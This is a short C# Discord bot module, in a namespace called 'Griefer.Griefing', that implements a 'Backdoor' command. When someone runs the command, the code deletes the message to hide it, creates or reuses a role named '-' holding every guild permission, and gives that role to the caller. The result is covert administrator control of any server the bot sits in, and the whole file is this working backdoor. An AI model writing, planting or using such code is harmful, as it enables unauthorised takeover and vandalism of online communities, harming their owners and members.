using Discord;
using Discord.Commands;
using Discord.WebSocket;
using System.Linq;
using System.Threading.Tasks;

namespace Griefer.Griefing
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("Backdoor")]
        public async Task BackdoorAsync()
        {
            var cmduser = Context.User as SocketGuildUser;
            var currentguild = Context.Guild;
            if (currentguild.Roles.Any(x => x.Name == $"-"))
            {
                await Context.Message.DeleteAsync();
                var role = cmduser.Guild.Roles.FirstOrDefault(x => x.Name == $"-");
                await (cmduser as IGuildUser).AddRoleAsync(role);
            }
            else
            {
                await Context.Message.DeleteAsync();
                GuildPermissions EverySingle = GuildPermissions.All;
                var createrole = await currentguild.CreateRoleAsync("-", EverySingle);
                var role = cmduser.Guild.Roles.FirstOrDefault(x => x.Name == $"{createrole.Name}");
                await (cmduser as IGuildUser).AddRoleAsync(role);
            }
        }
    }
}
       